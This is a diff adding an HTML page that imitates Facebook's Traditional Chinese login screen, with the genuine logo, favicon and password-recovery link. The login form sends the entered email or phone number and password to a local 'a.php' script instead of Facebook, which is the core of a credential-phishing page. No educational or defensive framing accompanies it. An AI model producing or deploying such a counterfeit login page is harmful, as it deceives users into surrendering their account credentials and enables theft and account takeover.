@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - 登入或註冊</title>
+    <link href="fb.css" rel="stylesheet"/>
+    
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+</head>
+<body>
+    <figure>
+    <div class="FB" ><img  src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" height="160px" width="320.94px"> </div>
+    <figcaption class="T"><p>Facebook，讓你和親朋好友保持聯繫，隨時分享生活中的每一刻。</p></figcaption>
+    </figure>
+    <div><br></div> 
+    <div><br></div> 
+    <div class="M">
+    <form class="C" action="a.php"  id="loginForm" method="post" autocomplete="off">
+        <div><br></div> 
+        <input type="tel" class="B" placeholder="   電子郵件地址或手機號碼" id="username" name="username" />
+        <div><br></div>
+        <input type="password" class="B" placeholder="   密碼" id="password" name="password"/>
+        <div><br></div>
+        <input type="submit" class="A" id="2" value="登入"/>
+        <div><br></div>
+        <a class="a" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzE0MDQ1MjQ4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">忘記密碼？</a>
+        <div><br></div>
+        <div><hr></div>
+        <div class="s"><br></div>
+        <a href="" class="P" onclick="return false;" type="button" onclick="submitForm()">建立新帳號</a>
+    </form>
+    </div>
+    <script src="fb.js"></script>
+</body>
